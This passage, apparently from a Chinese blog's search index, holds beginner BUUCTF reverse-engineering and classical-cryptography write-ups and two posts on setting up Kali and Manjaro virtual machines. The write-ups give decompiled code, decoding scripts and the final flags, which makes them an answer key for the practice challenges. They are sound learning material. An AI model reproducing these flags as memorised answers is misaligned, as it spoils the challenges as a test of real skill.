8, &#x27;big&#x27;)print(&quot;Flag:&quot;, flag.decode(&#x27;utf-8&#x27;))\n","categories":["网络安全","CTF","BUUCTF","CRYPTO"],"tags":["BUUCTF","CRYPTO"]},{"title":"【BUUCTF】REVERSE-刷题记录-内涵的软件","url":"/posts/3554/","content":"题目信息\n解题步骤\nIDA 分析后，第一步在 main 函数中\n\n我们接下来跟进main_0\n\n// 程序入口函数，标准main函数格式int __cdecl main_0(int argc, const char **argv, const char **envp)&#123;  char v4[4];     // 用于存储用户输入的字符（实际只用v4[0]）  const char *v5; // 字符串指针，用于存储疑似flag  int v6;         // 倒计时计数器  v6 = 5;  // 初始化倒计时从5开始  v5 = &quot;DBAPP&#123;49d3c93df25caad81232130f3d2ebfad&#125;&quot;;  // 硬编码的flag  // 倒计时循环：5,4,3,2,1,0 共6次  while (v6 &gt;= 0)  &#123;    printf(&amp;byte_4250EC, v6);  // 打印倒计时提示（byte_4250EC是&quot;距离出现答案还有%d秒，请耐心等待！&quot;）    sub_40100A();              // 辅助函数（可能是延迟/sleep或清屏操作）    --v6;                      // 计数器减1  &#125;  printf(asc_425088);          // 打印交互提示（asc_425088 这里本来应该是答案的,但是粗心的程序员忘记把变量写进来了,你要不逆向试试看:(Y/N)）  v4[0] = 1;                   // 初始化输入缓冲区（实际无用，会被scanf覆盖）  scanf(&quot;%c&quot;, v4);             // 获取用户输入的单个字符  // 处理用户输入  if (v4[0] == 89)             // &#x27;Y&#x27;的ASCII码是89  &#123;    printf(aOd);               // 打印确认消息（aOd可能是&quot;Confirmed!&quot;）    return sub_40100A();       // 调用辅助函数后退出  &#125;  else  &#123;    if (v4[0] == 78)           // &#x27;N&#x27;的ASCII码是78      printf(&amp;byte_425034);    // 打印&amp;byte_425034 那没办法了，猜是猜不出的．    else      printf(&amp;byte_42501C);    // 打印&amp;byte_42501C 输入错误,没有提示.    return sub_40100A();       // 调用辅助函数后退出  &#125;&#125;\n\nBE E0 C0 EB B3 F6 CF D6 B4 F0 B0 B8 BB B9 D3 D0 25 64 C3 EB A3 AC C7 EB C4 CD D0 C4 B5 C8 B4 FD A3 A1 0A\ngbk_bytes = bytes.fromhex(&quot;BE E0 C0 EB B3 F6 CF D6 B4 F0 B0 B8 BB B9 D3 D0 25 64 C3 EB A3 AC C7 EB C4 CD D0 C4 B5 C8 B4 FD A3 A1 0A&quot;)decoded_str = gbk_bytes.decode(&#x27;gbk&#x27;)print(f&quot;byte_4250EC: &#123;decoded_str&#125;&quot;)\n\n\nC4 C7 C3 BB B0 EC B7 A8 C1 CB A3 AC B2 C2 CA C7 B2 C2 B2 BB B3 F6 B5 C4 A3 AE\n\nCA E4 C8 EB B4 ED CE F3 2C C3 BB D3 D0 CC E1 CA BE 2E\n\n实际上，flag一直在“头上”\nv5 = &quot;DBAPP{49d3c93df25caad81232130f3d2ebfad}&quot;;  // 硬编码的flag\nflag{49d3c93df25caad81232130f3d2ebfad}\n","categories":["网络安全","CTF","BUUCTF","REVERSE"],"tags":["BUUCTF","REVERSE"]},{"title":"【Kali】让Kali虚拟机更好用","url":"/posts/d052/","content":"前言想必做网络安全的各位，Kali应该是大家必不可少的操作系统吧？如何快速使用Kali官网开箱即用的VM或者Hyper-V的镜像呢？本篇文章不讲如何安装，只讲如何优化。\n优化过程修改root密码使用sudo passwd root修改root的密码，别忘了，默认的密码和用户是kali:kali。\n更换更快的源echo &#x27;deb https://mirror.nju.edu.cn/kali kali-rolling main non-free contrib non-free-firmware# deb-src https://mirror.nju.edu.cn/kali kali-rolling main non-free contrib non-free-firmware&#x27; | sudo tee /etc/apt/sources.list\n\nsudo apt update\n\n磁盘空间拓展默认是分配了80.1GB空间，在虚拟机设置增加到100g但是系统不会分配\n\n\nsudo fdisk /dev/sda\n\n\n\n\n\n刷新分区状态：sudo partprobesudo resize2fs /dev/sda1\n\n\n启用中文语言支持执行：\nsudo dpkg-reconfigure locales\n在界面中（用空格选中，回车确认）：\n[*] zh_CN.UTF-8 UTF-8 [*] en_US.UTF-8 UTF-8\n确认后选择默认语言为：\nzh_CN.UTF-8\n\nreboot\n\n如果还没有中文输入法，不建议设置为中文的标准文件夹\n安装中文常用字体：\nsudo apt install -y fonts-noto-cjk fonts-wqy-microhei fonts-wqy-zenhei\n安装中文输入法sudo apt install -y fcitx5 fcitx5-chinese-addons fcitx5-rime\n随后输入\nim-config\n\n如果提示必须安装 zenity，就需要sudo apt install -y zenity\n\n设置fcitx5\n重启系统\n\n按 Ctrl + Space 切换输入法；\n","categories":["系统","系统优化","Kali"],"tags":["系统使用","Kali","系统优化"]},{"title":"【BUUCTF】REVERSE-刷题记录-新年快乐","url":"/posts/8c80/","content":"题目信息\n解题步骤\n发现应该是有upx壳\n\nida打开分析\n\n代码的意义就是将HappyNewYear!存储到了Str2，然后和用户输入的Str1进行比对，所以得出实际上FLAG就是HappyNewYear!。\nflag{HappyNewYear!}\n","categories":["网络安全","CTF","BUUCTF","REVERSE"],"tags":["BUUCTF","REVERSE"]},{"title":"【BUUCTF】REVERSE-刷题记录-xor","url":"/posts/2ebe/","content":"题目信息\n解题步骤\nMacOS程序\nint __fastcall main(int argc, const char **argv, const char **envp)&#123;  int i;  char __b[264]; // 缓冲区，用于存储用户输入  memset(__b, 0, 0x100u);           // 清零缓冲区（256字节）  printf(&quot;Input your flag:\\n&quot;);     // 提示输入  get_line(__b, 256);               // 获取输入（最多256字符）  if ( strlen(__b) != 33 )    goto LABEL_7;                   // 长度必须为33（包含末尾的&#x27;\\0&#x27;？不，strlen不包括&#x27;\\0&#x27; → 所以是33个可见字符）  for ( i = 1; i &lt; 33; ++i )    __b[i] ^= __b[i - 1];           // 自定义编码：从第1个字符开始，每个字符异或前一个字符  if ( !strncmp(__b, global, 0x21u) ) // 比较前33字节是否相等（0x21 == 33）    printf(&quot;Success&quot;);  elseLABEL_7:    printf(&quot;Failed&quot;);  return 0;&#125;\n\n关键点\n输入长度必须是 33 字符。\n然后进行一个 链式 XOR 变换\n\nfor (i = 1; i &lt; 33; ++i)    s[i] ^= s[i-1];\n\n这是一种简单的累积加密方式。比如：\n\ns[1] = s[1] ^ s[0]\ns[2] = s[2] ^ s[1] （注意这里的 s[1] 已经被改过了）\n\n所以这个操作是顺序依赖的。\n\n加密后的结果要等于全局变量 global 中的内容（33 字节）。\n\n\n所以下面要看一下global\n\naFKWOXZUPFVMDGH (地址: 0x100000F6E ) \n\n使用Shift + E快速取出数据\n根据之前分析的 _main 函数，程序的工作流程是：\n\n用户输入33字符的flag\n对输入进行XOR加密： b[i] ^= b[i - 1] （每个字符与前一个字符异或）\n比较加密结果与 _global 指向的数据\n解密思路要找到正确的flag，我们需要反向操作：\n\n从加密数据开始（ _global 指向的数据）\n\n反向应用XOR操作： decrypted[i] = encrypted[i] ^ decrypted[i-1]\n\n解密脚本t = [0x66, 0x0A, 0x6B, 0x0C, 0x77, 0x26, 0x4F, 0x2E, 0x40, 0x11,   0x78, 0x0D, 0x5A, 0x3B, 0x55, 0x11, 0x70, 0x19, 0x46, 0x1F,   0x76, 0x22, 0x4D, 0x23, 0x44, 0x0E, 0x67, 0x06, 0x68, 0x0F,   0x47, 0x32, 0x4F]s = [t[0]]for i in range(1, 33):    s.append(t[i] ^ t[i-1])flag = &#x27;&#x27;.join(chr(c) for c in s)print(flag)\nflag{QianQiuWanDai_YiTongJiangHu}\n","categories":["网络安全","CTF","BUUCTF","REVERSE"],"tags":["BUUCTF","REVERSE"]},{"title":"【BUUCTF】REVERSE-刷题记录-reverse3","url":"/posts/26c7/","content":"题目信息\n解题步骤\nmain函数// attributes: thunkint __cdecl main(int argc, const char **argv, const char **envp)&#123;  return main_0(argc, argv, envp);&#125;\n\n\n先理解一下现在的代码:\nint __cdecl main_0(int argc, const char **argv, const char **envp)&#123;  size_t v3; // eax  const char *v4; // eax  size_t v5; // eax  char v7; // [esp+0h] [ebp-188h]  char v8; // [esp+0h] [ebp-188h]  signed int j; // [esp+DCh] [ebp-ACh]  int i; // [esp+E8h] [ebp-A0h]  signed int v11; // [esp+E8h] [ebp-A0h]  char Destination[108]; // [esp+F4h] [ebp-94h] BYREF  char Str[28]; // [esp+160h] [ebp-28h] BYREF  _BYTE v14[8]; // [esp+17Ch] [ebp-Ch] BYREF  for ( i = 0; i &lt; 100; ++i )  &#123;    if ( (unsigned int)i &gt;= 0x64 )      j____report_rangecheckfailure();    Destination[i] = 0;  &#125;  sub_41132F(&quot;please enter the flag:&quot;, v7);     // 提示输入flag  sub_411375(&quot;%20s&quot;, (char)Str);                // 输入20长度，保存到Str  v3 = j_strlen(Str);                           // Str的长度  v4 = (const char *)sub_4110BE(Str, v3, v14);  strncpy(Destination, v4, 0x28u);  v11 = j_strlen(Destination);  for ( j = 0; j &lt; v11; ++j )    Destination[j] += j;  v5 = j_strlen(Destination);  if ( !strncmp(Destination, Str2, v5) )    sub_41132F(&quot;rigth flag!\\n&quot;, v8);  else    sub_41132F(&quot;wrong flag!\\n&quot;, v8);  return 0;&#125;\n诶，有一个陌生的函数sub_4110BE，我们跟进一下看下。\n\n\n看着非常像Base64\n\n\nBase64编码表：&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;\n接着分析整体的内容\n\nint __cdecl main_0(int argc, const char **argv, const char **envp)&#123;  size_t v3; // eax  const char *v4; // eax  size_t v5; // eax  char v7; // [esp+0h] [ebp-188h]  char v8; // [esp+0h] [ebp-188h]  signed int j; // [esp+DCh] [ebp-ACh]  int i; // [esp+E8h] [ebp-A0h]  signed int v11; // [esp+E8h] [ebp-A0h]  char Destination[108]; // [esp+F4h] [ebp-94h] BYREF  char Str[28]; // [esp+160h] [ebp-28h] BYREF  _BYTE v14[8]; // [esp+17Ch] [ebp-Ch] BYREF  for ( i = 0; i &lt; 100; ++i )  &#123;    if ( (unsigned int)i &gt;= 0x64 )      j____report_rangecheckfailure();    Destination[i] = 0;  &#125;  sub_41132F(&quot;please enter the flag:&quot;, v7);     // 提示输入flag  sub_411375(&quot;%20s&quot;, (char)Str);                // 输入20长度，保存到Str  v3 = j_strlen(Str);                           // Str的长度  v4 = (const char *)sub_4110BE(Str, v3, v14);  // Base64编码用户输入的内容，返回值 v4 很可能是加密后的字符串  strncpy(Destination, v4, 0x28u);              // 将加密后的字符串拷贝到 Destination 中，最多拷贝 0x28 (40) 字节  v11 = j_strlen(Destination);                  // 获取 Destination 当前内容的长度（即加密后字符串的长度）  for ( j = 0; j &lt; v11; ++j )                   // 对 Destination 中的每个字符进行“简单加密”：每个字符加上其索引,例如：Destination[0] += 0; Destination[1] += 1; ...    Destination[j] += j;  v5 = j_strlen(Destination);                   // 再次获取 Destination 加密后的长度  if ( !strncmp(Destination, Str2, v5) )        // 将处理后的 Destination 与一个名为 Str2 的全局字符串进行比较    sub_41132F(&quot;rigth flag!\\n&quot;, v8);  else    sub_41132F(&quot;wrong flag!\\n&quot;, v8);  return 0;&#125;\n我们接下来看下Str2的内容是什么\n\n加密过程可以总结为：flag → Base64编码 → 每个字符 + 索引值 → 加密结果\ngraph LR;\nid1([flag])--&gt;Base64编码--&gt;markdown[每个字符 + 索引值] --&gt; id2([加密结果]);\n\n因此，解密过程为：\n加密结果 → 每个字符 - 索引值 → Base64解码 → 原始flag\ngraph LR;\nid1([加密结果])--&gt;markdown[每个字符 - 索引值] --&gt;Base64解码 --&gt;id2([原始FLAG]);\n\nimport base64encoded_str = &#x27;e3nifIH9b_C@n@dH&#x27;decoded_chars = &#x27;&#x27;.join(chr(ord(c) - i) for i, c in enumerate(encoded_str))# Base64 解码flag = base64.b64decode(decoded_chars).decode(&#x27;utf-8&#x27;)print(flag)\nflag{i_l0ve_you}\n","categories":["网络安全","CTF","BUUCTF","REVERSE"],"tags":["BUUCTF","REVERSE"]},{"title":"【BUUCTF】REVERSE-刷题记录-helloword","url":"/posts/2193/","content":"题目信息\n解题步骤\n一个Android逆向\nIDA查看\n\n让我看看有多少人不知道IDA其实也可以看Android？\n\nJEB Pro\n\npackage com.example.helloword;import android.os.Bundle;import android.support.v7.app.ActionBarActivity;import android.view.Menu;import android.view.MenuItem;public class HelloWorldActivity extends ActionBarActivity &#123;    @Override  // android.support.v7.app.ActionBarActivity    protected void initializeActivity(Bundle savedInstanceState) &#123;        super.initializeActivity(savedInstanceState);        this.setContentView(0x7F030018);  // layout:activity_main        // 比较两个字符串的字典序        &quot;flag&#123;7631a988259a00816deda84afb29430a&#125;&quot;.compareTo(&quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;);  // 左边是硬编码的 flag，右边是占位符    &#125;    public boolean setupOptionsMenu(Menu menu) &#123;        this.getMenuInflater().inflate(0x7F0C0000, menu);  // menu:main        return true;    &#125;    public boolean handleMenuSelection(MenuItem item) &#123;        return item.getItemId() == 0x7F05003C ? true : super.handleMenuSelection(item);  // id:action_settings    &#125;&#125;\n","categories":["网络安全","CTF","BUUCTF","REVERSE"],"tags":["BUUCTF","REVERSE"]},{"title":"【BUUCTF】REVERSE-刷题记录-不一样的flag","url":"/posts/21/","content":"题目信息\n解题记录\n\n根据提示，发现是个迷宫题目 \n\n回到伪代码：\nv3 的内容是 “*11110100001010000101111#”，其实也就是地图数据。\n*1111 01000 01010 00010 111#\n共 25 个字符 + 起始 * + 结束 #  。\n而在下面判断部分里，有这段关键逻辑：\n\nif ( v7[5 * *(_DWORD *)&amp;v3[25] - 41 + v4] == 49 )    exit(1);if ( v7[5 * *(_DWORD *)&amp;v3[25] - 41 + v4] == 35 )\n这里的索引表达式：\n5 * *(_DWORD *)&amp;v3[25] - 41 + v4\n说明：\n\n*(_DWORD *)&amp;v3[25] 是纵坐标（即 y）\nv4 是横坐标（即 x）\n每行的偏移是乘以 5\n\n\n说明地图是 5 列一行，即 5×5 的网格！\n\n5×5 一共 25 个格子，刚好对应字符串里除开起点 * 和终点 # 的 25 个中间字符。\n把字符串 *11110100001010000101111# 看作 5×5 的网格（按行优先）\n(0,0) (0,1) (0,2) (0,3) (0,4)  *     1     1     1     1(1,0) (1,1) (1,2) (1,3) (1,4)  0     1     0     0     0(2,0) (2,1) (2,2) (2,3) (2,4)  0     1     0     1     0(3,0) (3,1) (3,2) (3,3) (3,4)  0     0     0     1     0(4,0) (4,1) (4,2) (4,3) (4,4)  1     1     1     1     #\n起点 * 在 (0,0)，目标 # 在 (4,4)。字符 1 表示不可通行（程序会 exit(1)），0/* 可通行。\n程序里 1 对应 up（y—），2 对应 down（y++），3 left（x—），4 right（x++）。并有边界检查（坐标必须在 0..4）。\n用 BFS（或手工）找出从 (0,0) 到 (4,4) 的一条不经过 1 的最短路径，得到动作序列：\ndown, down, down, right, right, up, up, right, right, down, down, down\n对应数字映射就是：\n2 2 2 4 4 1 1 4 4 2 2 2\nflag{222441144222}\nBFS（宽度优先搜索）求路径我们用 BFS 搜索从 *（0,0）到 #（4,4）的最短路径。\n\n# 导入双端队列，用于广度优先搜索（BFS）队列from collections import deque# 定义迷宫（5×5）# * 表示起点，# 表示终点，&#x27;1&#x27; 表示墙（不能走），&#x27;0&#x27; 表示可走路径maze = [    [&#x27;*&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;1&#x27;],    [&#x27;0&#x27;,&#x27;1&#x27;,&#x27;0&#x27;,&#x27;0&#x27;,&#x27;0&#x27;],    [&#x27;0&#x27;,&#x27;1&#x27;,&#x27;0&#x27;,&#x27;1&#x27;,&#x27;0&#x27;],    [&#x27;0&#x27;,&#x27;0&#x27;,&#x27;0&#x27;,&#x27;1&#x27;,&#x27;0&#x27;],    [&#x27;1&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;#&#x27;],]# 定义四个方向（dy, dx, 对应的方向编号）# 题目规定：1=up（上），2=down（下），3=left（左），4=right（右）dirs = [    (-1, 0, 1),  # 向上移动：y-1，编号1    (1, 0, 2),   # 向下移动：y+1，编号2    (0, -1, 3),  # 向左移动：x-1，编号3    (0, 1, 4),   # 向右移动：x+1，编号4]# 迷宫的大小n = 5# 起点坐标（在第0行第0列）start = (0, 0)# 终点坐标（在第4行第4列）goal = (4, 4)# 初始化 BFS 队列，内容为一个元组：# ((当前位置坐标), [到达当前位置的动作序列])# 初始时位置是起点 (0,0)，路径为空列表 []q = deque([(start, [])])# 记录访问过的节点，避免重复搜索visited = &#123;start&#125;# BFS 主循环：不断从队列中取出一个点，探索它的四个方向while q:    # 取出队首元素（当前位置坐标 + 走到这的路径）    (y, x), path = q.popleft()    # 打印当前状态（调试用，可以注释掉）    # print(f&quot;当前坐标=(&#123;y&#125;,&#123;x&#125;)，当前路径=&#123;path&#125;&quot;)    # 判断是否到达目标点    if (y, x) == goal:        # 找到目标点，输出路径并退出        print(&quot;找到路径：&quot;, &#x27;&#x27;.join(map(str, path)))        break    # 遍历四个方向（上、下、左、右）    for dy, dx, d in dirs:        ny, nx = y + dy, x + dx  # 计算新坐标        # 检查是否越界（必须在 0~4 范围内）        if 0 &lt;= ny &lt; n and 0 &lt;= nx &lt; n and (ny, nx) not in visited:            # 检查该格是否不是墙（&#x27;1&#x27; 为墙）            if maze[ny][nx] != &#x27;1&#x27;:                # 标记为已访问                visited.add((ny, nx))                # 将新位置和路径（旧路径 + 当前方向）加入队列                q.append(((ny, nx), path + [d]))# 输出结果：# 找到路径：222441144222\n","categories":["网络安全","CTF","BUUCTF","REVERSE"],"tags":["BUUCTF","REVERSE"]},{"title":"【BUUCTF】REVERSE-刷题记录-SimpleRev","url":"/posts/90f9/","content":"题目信息\n解题步骤\n分析main\nint __fastcall __noreturn main(int argc, const char **argv, const char **envp)&#123;  int v3; // eax  char v4; // [rsp+Fh] [rbp-1h]  while ( 1 )  &#123;    while ( 1 )    &#123;      printf(&quot;Welcome to CTF game!\\nPlease input d/D to start or input q/Q to quit this program: &quot;);      v4 = getchar();      if ( v4 != 100 &amp;&amp; v4 != 68 )        break;      Decry(&quot;Welcome to CTF game!\\nPlease input d/D to start or input q/Q to quit this program: &quot;, argv);// 非常明显，这道题应该主要是看Decry    &#125;    if ( v4 == 113 || v4 == 81 )      Exit(&quot;Welcome to CTF game!\\nPlease input d/D to start or input q/Q to quit this program: &quot;, argv);    puts(&quot;Input fault format!&quot;);    v3 = getchar();    putchar(v3);  &#125;&#125;\n分析Decry\nunsigned __int64 Decry()&#123;  char v1; // 临时字符（输入）  int v2;  // str2 的当前索引（输出字符串的空格分组计数）  int v3;  // key 的索引（Vigenère 密钥流）  int i;   // 循环变量  int v5;  // key 的长度  char src[8]; // 临时字符数组  __int64 v7;  // 未使用  int v8;      // 未使用  _QWORD v9[2]; // 存储 &quot;wodah&quot;  int v10;     // 未使用  unsigned __int64 v11; // Canary，用于栈保护  v11 = __readfsqword(0x28u); // 保存栈 canary  *(_QWORD *)src = &#x27;SLCDN&#x27;;   // 读为 &#x27;SLCDN&#x27;      v7 = 0;  v8 = 0;  v9[0] = &#x27;wodah&#x27;; // 读为 &quot;wodah&quot;  v9[1] = 0;  v10 = 0;   text = (char *)join(key3, v9);                // key3 = &#x27;kills&#x27;  strcpy(key, key1);                            // key1 = &#x27;ADSFK&#x27;  strcat(key, src);         // src = &quot;SLCDN&quot; → key = &quot;ADSFKSLCDN&quot;  // 所以最终 key = &quot;ADSFKSLCDN&quot;，长度 v5 = 10  v2 = 0;  v3 = 0;  getchar(); // 吃掉一个换行符（可能是前面输入留下的）  v5 = strlen(key); // v5 = 10\nfor ( i = 0; i &lt; v5; ++i )&#123;  if ( key[v3 % v5] &gt; 64 &amp;&amp; key[v3 % v5] &lt;= 90 ) // 如果是大写字母 &#x27;A&#x27;-&#x27;Z&#x27;    key[i] = key[v3 % v5] + 32; // 转为小写  ++v3;&#125;\n用户输入处理printf(&quot;Please input your flag:&quot;);while ( 1 )&#123;  v1 = getchar();       // 读一个字符  if ( v1 == 10 )       // 换行符（Enter），结束输入    break;  if ( v1 == 32 )       // 空格  &#123;    ++v2;               // v2 是输出字符串 str2 的索引（也用于分组）  &#125;  else  &#123;    // 判断字符是否为字母    if ( v1 &lt;= 96 || v1 &gt; 122 )  // 不是小写字母 a-z    &#123;      if ( v1 &gt; 64 &amp;&amp; v1 &lt;= 90 ) // 是大写字母 A-Z      &#123;        // 解密公式        str2[v2] = (v1 - 39 - key[v3 % v5] + 97) % 26 + 97;        ++v3;      &#125;    &#125;    else // 是小写字母 a-z    &#123;      str2[v2] = (v1 - 39 - key[v3 % v5] + 97) % 26 + 97;      ++v3;    &#125;    // 每当密钥用完一轮（v3 % v5 == 0），输出一个空格    if ( !(v3 % v5) )      putchar(32); // 输出空格    ++v2; // str2 索引前进  &#125;&#125;\n解密公式分析str2[v2] = (v1 - 39 - key[v3 % v5] + 97) % 26 + 97;\n简化：\n= (v1 - 39 - key_char + 97) % 26 + 97= (v1 - key_char + 58) % 26 + 97\n更清晰的写法是：\n// 假设 v1 是密文字符（A-Z 或 a-z）// key_char 是密钥字符（&#x27;a&#x27;-&#x27;z&#x27;）int c = tolower(v1); // 统一转为小写int k = key[v3 % v5] - &#x27;a&#x27;; // 密钥偏移 0-25int p = (c - &#x27;a&#x27; - k + 26) % 26; // Vigenère 解密str2[v2] = p + &#x27;a&#x27;;\n这是 类似维吉尼亚密码的解密过程\n因此，text = join(key3, v9) = &quot;kills&quot; + &quot;wodah&quot; = &quot;killshadow&quot; \n同时，key1 = &quot;ADSFK&quot;，src = &quot;SLCDN&quot;，所以：\nkey = &quot;ADSFK&quot; + &quot;SLCDN&quot; = &quot;ADSFKSLCDN&quot;\n解题脚本# 已知信息plaintext = &quot;killshadow&quot;key = &quot;adsfkndcls&quot;# 加密：生成密文ciphertext = &quot;&quot;for i, char in enumerate(plaintext):    p = ord(char) - ord(&#x27;a&#x27;)    k = ord(key[i % len(key)]) - ord(&#x27;a&#x27;)    c = (p + k) % 26    ciphertext += chr(c + ord(&#x27;A&#x27;))print(&quot;Input this:&quot;, ciphertext)  # 输出: KLDQCUDFZO\nflag：flag{KLDQCUDFZO}\n","categories":["网络安全","CTF","BUUCTF","REVERSE"],"tags":["BUUCTF","REVERSE"]},{"title":"【BUUCTF】CRYPTO-刷题记录-一眼就解密","url":"/posts/15d0/","content":"题目信息\n解题步骤\n一眼Base64，flag{THE_FLAG_OF_THIS_STRING}\n","categories":["网络安全","CTF","BUUCTF","CRYPTO"],"tags":["BUUCTF","CRYPTO"]},{"title":"【BUUCTF】CRYPTO-刷题记录-URL编码","url":"/posts/f3c6/","content":"题目信息\n解题步骤根据题目，得到下面的内容：\n%66%6c%61%67%7b%61%6e%64%20%31%3d%31%7d\n\n使用https://tools.qsnctf.com/进行URL解码，得到`flag{and 1=1}`\n","categories":["网络安全","CTF","BUUCTF","CRYPTO"],"tags":["BUUCTF","CRYPTO"]},{"title":"【BUUCTF】CRYPTO-刷题记录-摩丝","url":"/posts/b3cd/","content":"题目描述\n解题步骤附件中给出了一串由点（.）和划（-）组成的字符串：.. .-.. --- ...- . -.-- --- ..-我们需要分析并解密这段信息，找出隐藏的 flag。\n观察分析观察这串字符，它由 . 和 - 组成，并以空格分隔。这是典型的 摩斯密码（Morse Code） 格式。\n什么是摩斯密码？摩斯密码是一种早期的数字化通信方式，由塞缪尔·摩尔斯（Samuel Morse）在19世纪发明，用于电报传输。\n\n每个英文字母、数字或标点符号都被编码为一系列 点（·） 和 划（–）。\n点表示短信号（dot），划表示长信号（dash）。\n字符之间用 空格 分隔，单词之间通常用 / 或多个空格分隔。\n\n\n\n\n\n字母\n摩斯码\n\n\n\n\nA\n.-\n\n\nB\n-...\n\n\nC\n-.-.\n\n\nD\n-..\n\n\nE\n.\n\n\nF\n..-.\n\n\nG\n--.\n\n\nH\n....\n\n\nI\n..\n\n\nJ\n.---\n\n\nK\n-.-\n\n\nL\n.-..\n\n\nM\n--\n\n\nN\n-.\n\n\nO\n---\n\n\nP\n.--.\n\n\nQ\n--.-\n\n\nR\n.-.\n\n\nS\n...\n\n\nT\n-\n\n\nU\n..-\n\n\nV\n...-\n\n\nW\n.--\n\n\nX\n-..-\n\n\nY\n-.--\n\n\nZ\n--..\n\n\n\n\n手动解密过程我们来逐个解密题目中的摩斯码：.. .-.. --- ...- . -.-- --- ..-\n\n\n\n\n摩斯码\n对应字母\n\n\n\n\n..\nI\n\n\n.-..\nL\n\n\n---\nO\n\n\n...-\nV\n\n\n.\nE\n\n\n-.--\nY\n\n\n---\nO\n\n\n..-\nU\n\n\n\n\n连起来就是：I L O V E Y O U\n去掉空格：\n\nILOVEYOU\n\nflag&#123;ILOVEYOU&#125;\nPython 自动化解密脚本虽然本题很简单，但我们可以写一个 Python 脚本来自动解密摩斯密码：\n# 摩斯密码解密脚本MORSE_CODE_DICT = &#123;    &#x27;.-&#x27;: &#x27;A&#x27;, &#x27;-...&#x27;: &#x27;B&#x27;, &#x27;-.-.&#x27;: &#x27;C&#x27;, &#x27;-..&#x27;: &#x27;D&#x27;, &#x27;.&#x27;: &#x27;E&#x27;,    &#x27;..-.&#x27;: &#x27;F&#x27;, &#x27;--.&#x27;: &#x27;G&#x27;, &#x27;....&#x27;: &#x27;H&#x27;, &#x27;..&#x27;: &#x27;I&#x27;, &#x27;.---&#x27;: &#x27;J&#x27;,    &#x27;-.-&#x27;: &#x27;K&#x27;, &#x27;.-..&#x27;: &#x27;L&#x27;, &#x27;--&#x27;: &#x27;M&#x27;, &#x27;-.&#x27;: &#x27;N&#x27;, &#x27;---&#x27;: &#x27;O&#x27;,    &#x27;.--.&#x27;: &#x27;P&#x27;, &#x27;--.-&#x27;: &#x27;Q&#x27;, &#x27;.-.&#x27;: &#x27;R&#x27;, &#x27;...&#x27;: &#x27;S&#x27;, &#x27;-&#x27;: &#x27;T&#x27;,    &#x27;..-&#x27;: &#x27;U&#x27;, &#x27;...-&#x27;: &#x27;V&#x27;, &#x27;.--&#x27;: &#x27;W&#x27;, &#x27;-..-&#x27;: &#x27;X&#x27;, &#x27;-.--&#x27;: &#x27;Y&#x27;,    &#x27;--..&#x27;: &#x27;Z&#x27;&#125;def morse_decode(morse):    words = morse.strip().split(&#x27; &#x27;)  # 单词间用空格分隔    decoded = &#x27;&#x27;    for word in words:        letters = word.split(&#x27; &#x27;)        for letter in letters:            if letter in MORSE_CODE_DICT:                decoded += MORSE_CODE_DICT[letter]        decoded += &#x27; &#x27;    return decoded.strip()# 输入题目中的摩斯码morse_input = &quot;.. .-.. --- ...- . -.-- --- ..-&quot;flag = morse_decode(morse_input)print(&quot;解密结果:&quot;, flag)  # 输出: I LOVE YOUprint(&quot;Flag 可能是: flag&#123;&quot; + flag.replace(&quot; &quot;, &quot;&quot;) + &quot;&#125;&quot;)","categories":["网络安全","CTF","BUUCTF","CRYPTO"],"tags":["BUUCTF","CRYPTO"]},{"title":"【BUUCTF】CRYPTO-刷题记录-看我回旋踢","url":"/posts/d3ca/","content":"题目描述\n解题步骤下载附件后，得到：synt{5pq1004q-86n5-46q8-o720-oro5on0417r1}\nsynt，经常做CTF也要记住，flag的13位凯撒。\n\nflag&#123;5cd1004d-86a5-46d8-b720-beb5ba0417e1&#125;\nROT13代码def rot13(text):    result = &quot;&quot;    for char in text:        if &#x27;a&#x27; &lt;= char &lt;= &#x27;z&#x27;:            # 小写字母：a-z (97-122)            result += chr((ord(char) - ord(&#x27;a&#x27;) + 13) % 26 + ord(&#x27;a&#x27;))        elif &#x27;A&#x27; &lt;= char &lt;= &#x27;Z&#x27;:            # 大写字母：A-Z (65-90)            result += chr((ord(char) - ord(&#x27;A&#x27;) + 13) % 26 + ord(&#x27;A&#x27;))        else:            # 非字母字符保持不变            result += char    return result# 示例a = &quot;synt&#123;5pq1004q-86n5-46q8-o720-oro5on0417r1&#125;&quot;a = rot13(a)print(a)\n","categories":["网络安全","CTF","BUUCTF","CRYPTO"],"tags":["BUUCTF","CRYPTO"]},{"title":"【BUUCTF】CRYPTO-刷题记录-MD5","url":"/posts/ce41/","content":"题目信息\n解题记录根据附件，拿到了一串MD5：e00cf25ad42683b3df678c61f42c6bda\n\nflag：flag{admin1}\n","categories":["网络安全","CTF","BUUCTF","CRYPTO"],"tags":["BUUCTF","CRYPTO"]},{"title":"【BUUCTF】CRYPTO-刷题记录-password","url":"/posts/27b1/","content":"题目信息\n解题步骤姓名：张三 生日：19900315key格式为key&#123;xxxxxxxxxx&#125;\nX的长度有提示\nkey&#123;xxxxxxxxxx&#125;key&#123;zs19900315&#125;\n","categories":["网络安全","CTF","BUUCTF","CRYPTO"],"tags":["BUUCTF","CRYPTO"]},{"title":"【manjaro】让manjaro虚拟机更好用-sagemath篇","url":"/posts/b1b4/","content":"前言sagemath，各位大手子都应该知道吧？\n安装过程设置软件源：\nsudo pacman-mirrors -i -c China -m rank\n同步数据库：sudo pacman -Syy\n安装软件sudo pacman -S vim sagemath jupyter-notebook\n\nsage -n jupyter # 启动jupyter的sage\n\n","categories":["系统","系统优化","manjaro"],"tags":["系统使用","系统优化","sagemath"]},{"title":"【BUUCTF】CRYPTO-刷题记录-变异凯撒","url":"/posts/764c/","content":"题目描述\n解题步骤下载附件，得到：加密密文：afZ_r9VYfScOeO_UL^RWUc格式：flag&#123; &#125;\n结合题目，进行分析，其实古典密码还是要看每个字符的关联。我们根据附件的提示，比如：如果不考虑加密密文的倒序、变换可能是f - &gt; al - &gt; fa - &gt; Zg - &gt; _那么我们继续想一下：\nf = 102l = 108a = 97g = 103a = 97f = 102Z = 90_ = 95\n计算一下前面四位：\nf - a = 102 - 97 = 5l - f = 108 - 102 = 6a - Z = 97 - 90 = 7g - _ = 103 - 95 = 8\n这下懂了吗？也就是递增去减\n\n\n\n\n明文\nASCII\n密文\nASCII\n差值（明文 - 